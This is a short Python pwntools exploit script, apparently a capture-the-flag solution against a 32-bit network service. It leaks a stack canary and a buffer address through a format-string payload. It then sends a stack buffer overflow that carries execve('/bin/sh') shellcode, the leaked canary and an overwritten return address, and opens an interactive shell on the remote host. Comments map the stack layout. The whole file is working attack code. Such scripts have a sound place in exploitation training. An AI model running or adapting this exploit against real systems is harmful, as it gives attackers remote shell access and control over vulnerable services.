#! /bin/python

from pwn import *

context.arch='i386'
#shellcode = asm(shellcraft.sh())
shellcode = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0b\x58\x99\xcd\x80"

# canary is 124 byte below when printf's str argument
# 0xbffff340    printf argument str ;idx=0
# ...
# 0xbffff358    buffer s
# ...
# 0xbffff3bc    <canary>            ;idx=31
# ...
# 0xbffff3c8    get_msg ebp
#               get_msg ret addr 
#               get_msg arg (&str)  ;idx=36
# ...
# 0xbffff3e8    str
payload1="%31$8x %36$8x"
#r=remote('192.168.44.132', 8888)
r=remote('172.13.1.7', 8000)
raw_input('debug')
r.recvuntil('name:')
r.send(payload1+'\n')
r.recvuntil('ctf!')
canary_str_leak = r.recvuntil('messages:')
print "================================="
print canary_str_leak.strip()
print "================================="
canary = int(canary_str_leak.strip()[0:8], 16)
str_addr = int(canary_str_leak.strip()[9:17], 16)
print "canary:"+hex(canary)
print "str_addr:"+hex(str_addr)

s_buf_addr = str_addr-0x90

payload2=(shellcode +                # get_messge buffer
     'a'*(0x70-0xc-len(shellcode)) + # between buffer and canary
     p32(canary)  +                  # canary
     'a'*(0xc-4)  +                  # between canary and ebp
     'a'*4 +                         # ebp
     p32(s_buf_addr))                # get_message return address
print enhex(payload2)

r.send(payload2+'\n')
r.interactive()
